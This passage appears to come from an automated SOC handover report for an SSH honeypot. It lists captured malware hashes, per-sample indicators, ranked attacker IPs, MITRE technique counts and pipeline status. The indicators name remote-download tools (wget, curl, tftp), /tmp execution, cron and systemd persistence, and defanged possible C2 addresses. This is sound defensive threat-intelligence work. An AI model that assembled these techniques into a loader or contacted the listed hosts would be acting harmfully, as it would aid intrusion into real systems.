| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `39.104.64[.]139` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 50 |
| `196.189.236[.]67` | ET | Ethio Telecom | **100** ⚠️ | 26 |
| `58.221.60[.]25` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `124.223.101[.]223` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 1 |
| `185.227.152[.]135` | HK | ANYUN INTERNET TECHNOLOGY (HONGKONG) CO.,LIMITED | **100** ⚠️ | 34 |
| `199.165.159[.]113` | US | The Shadowserver Foundation, Inc. | **100** ⚠️ | 5 |
| `106.13.46[.]138` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 5 |
| `76.33.238[.]214` | US | Charter Communications Inc | **100** ⚠️ | 3 |
| `120.27.215[.]143` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 3 |
| `193.112.192[.]91` | CN | Tencent Cloud Computing (Beijing) Co., Ltd | **100** ⚠️ | 2 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 404 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 367 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 183 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 108 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 82 |

---

## 🔕 False Positive Summary (102 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 18 |
| AbuseIPDB score 1 below threshold 25 | 7 |
| AbuseIPDB score 11 below threshold 25 | 2 |
| AbuseIPDB score 12 below threshold 25 | 9 |
| AbuseIPDB score 14 below threshold 25 | 2 |
| AbuseIPDB score 16 below threshold 25 | 4 |
| AbuseIPDB score 17 below threshold 25 | 5 |
| AbuseIPDB score 20 below threshold 25 | 3 |
| AbuseIPDB score 21 below threshold 25 | 3 |
| AbuseIPDB score 23 below threshold 25 | 6 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| AbuseIPDB score 8 below threshold 25 | 1 |
| AbuseIPDB score 9 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 39 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 623 cases |
| Tool 34  | Credential Extractor        | ✅ 2645 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 29 fingerprints |
| Tool 36  | Command Clustering          | ✅ 97 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 320 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 102 filtered (16.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 142 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 36 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 360 priority case(s) shown individually · 145 recon entry/entries in table (9 group(s) consolidating 25 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-25T15:15:21Z_
